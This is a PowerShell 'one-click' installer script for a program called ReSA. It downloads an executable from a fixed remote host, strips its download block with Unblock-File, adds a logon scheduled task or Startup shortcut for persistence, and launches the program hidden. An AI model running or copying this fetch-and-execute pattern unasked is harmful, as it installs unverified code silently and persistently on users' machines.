# ReSA remote one-click install
param(
    [string]$BaseUrl = "https://olxp.cc/download",
    [switch]$Silent
)

$ErrorActionPreference = "Stop"
$Dir = Join-Path $env:LOCALAPPDATA "ReSA"
$Exe = Join-Path $Dir "ReSA.exe"
$TempExe = Join-Path $env:TEMP "ReSA-download.exe"
$TaskName = "ReSA"
$Url = ($BaseUrl.TrimEnd("/") + "/ReSA.exe")
$LogFile = Join-Path $env:TEMP "ReSA-install.log"

function Write-InstallLog {
    param([string]$Text)
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $Text"
    try {
        Add-Content -LiteralPath $LogFile -Value $line -Encoding UTF8
    } catch {}
    if (-not $Silent) {
        Write-Host $Text
    }
}

function Show-InstallError {
    param([string]$Text)
    Write-InstallLog $Text
    if ($Silent) {
        try {
            $shell = New-Object -ComObject WScript.Shell
            $shell.Popup(
                "ReSA install failed.`n$Text`n`nLog: $LogFile",
                0,
                "ReSA",
                16
            ) | Out-Null
        } catch {}
    } else {
        Write-Host $Text -ForegroundColor Red
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutFile
    )

    $ProgressPreference = "SilentlyContinue"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    } catch {}

    $params = @{
        Uri = $Url
        OutFile = $OutFile
        UseBasicParsing = $true
    }
    if ($PSVersionTable.PSVersion.Major -lt 6) {
        $params.UserAgent = "ReSA-Installer/1.0"
    }
    Invoke-WebRequest @params
}

try {
    Write-InstallLog "install start"
    Write-InstallLog "download: $Url"
    Write-InstallLog "target: $Dir"

    New-Item -ItemType Directory -Force -Path $Dir | Out-Null

    Get-Process -Name "ReSA" -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500

    if (Test-Path -LiteralPath $TempExe) {
        Remove-Item -LiteralPath $TempExe -Force -ErrorAction SilentlyContinue
    }

    Download-File -Url $Url -OutFile $TempExe
    Write-InstallLog "download ok"

    if (-not (Test-Path -LiteralPath $TempExe)) {
        throw "ReSA.exe missing after download"
    }

    $length = (Get-Item -LiteralPath $TempExe).Length
    if ($length -lt 1MB) {
        throw "Downloaded file too small ($length bytes). Check server uploads ReSA.exe"
    }

    if (Test-Path -LiteralPath $Exe) {
        Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
    }
    Move-Item -LiteralPath $TempExe -Destination $Exe -Force

    Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
        -StartWhenAvailable -RestartCount 3 `
        -RestartInterval (New-TimeSpan -Minutes 1)

    try {
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
        Write-InstallLog "scheduled task ok"
    } catch {
        $Startup = [Environment]::GetFolderPath("Startup")
        $Wsh = New-Object -ComObject WScript.Shell
        $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReSA.lnk"))
        $Link.TargetPath = $Exe
        $Link.WorkingDirectory = $Dir
        $Link.WindowStyle = 7
        $Link.Save()
        Write-InstallLog "startup shortcut ok"
    }

    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
    Write-InstallLog "install complete"
    exit 0
} catch {
    Show-InstallError $_.Exception.Message
    exit 1
}
